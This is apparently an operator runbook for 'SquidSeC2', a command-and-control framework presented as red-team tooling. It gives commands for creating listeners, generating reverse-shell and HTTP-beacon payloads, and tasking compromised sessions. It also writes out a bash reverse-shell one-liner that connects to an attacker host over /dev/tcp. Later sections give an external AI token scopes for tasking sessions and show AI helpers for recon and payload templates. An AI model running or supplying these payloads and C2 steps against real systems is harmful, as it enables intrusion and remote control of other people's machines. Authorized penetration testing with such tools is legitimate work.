# SquidSeC2 Operator Runbook

Authorized red team / pen-test use only.

## Prerequisites

```bash
cd /path/to/squidsec2
python3 -m venv .venv && source .venv/bin/activate
pip install -e .
```

## Connect CLI to a server

```bash
# Token comes from server bootstrap file — never commit it
ss2 login --url http://<HOST>:8443 --token ss2_...
ss2 health
ss2 whoami
```

Config stored at `~/.config/squidsec2/config.json` (mode 0600).

## Reverse shell

```bash
ss2 listeners create rev-443 443 --kind reverse_shell
ss2 listeners start <listener_id>
ss2 payloads generate reverse_shell_bash <HOST> 443 --raw
```

On authorized target:

```bash
bash -c 'bash -i >& /dev/tcp/<HOST>/443 0>&1'
```

Operate:

```bash
ss2 sessions list
ss2 shell <session_id> "whoami"
ss2 events
```

### If reverse shell does not register

1. Listener `status` must be `running` (`ss2 listeners list`).
2. With Docker **bridge** networking, host must publish the port (`ports: ["443:443"]`).
3. With current compose **host** networking, process binds host ports directly.
4. Ports &lt; 1024 need host sysctl: `net.ipv4.ip_unprivileged_port_start=0` (container is non-root).
5. Host firewall must allow the port (`ufw allow 443/tcp`).
6. Target must reach `<HOST>:<port>` (egress/NAT).

## HTTP beacon

```bash
ss2 payloads generate http_beacon_python <HOST> 8443 --raw
# run payload on authorized target
ss2 sessions list
ss2 tasks create <session_id> "id"
ss2 tasks list --session <session_id>
ss2 tasks get <task_id>
```

## Tokens

```bash
ss2 tokens create ops \
  --scopes "sessions:read,sessions:write,tasks:read,tasks:write,listeners:read,listeners:write,payloads:generate,metrics:read,audit:read"

ss2 tokens create ext-ai \
  --scopes "mcp:connect,sessions:read,tasks:read,tasks:write,metrics:read" \
  --mcp-tools "list_sessions,get_session,list_tasks,create_task,get_metrics"
```

## Admin AI

```bash
ss2 ai recon_assist --data "windows domain host"
ss2 ai shell_classify --data "uid=0(root)"
ss2 ai payload_template --data "need bash http beacon"
```

Offline mode works without configured LLMs. Configure BYO LLM via `ss2 llm add ...`.

## Observability

```bash
ss2 metrics
ss2 audit --limit 50
ss2 events
ss2 policy get
```

## Interactive mode

```bash
ss2 repl
```
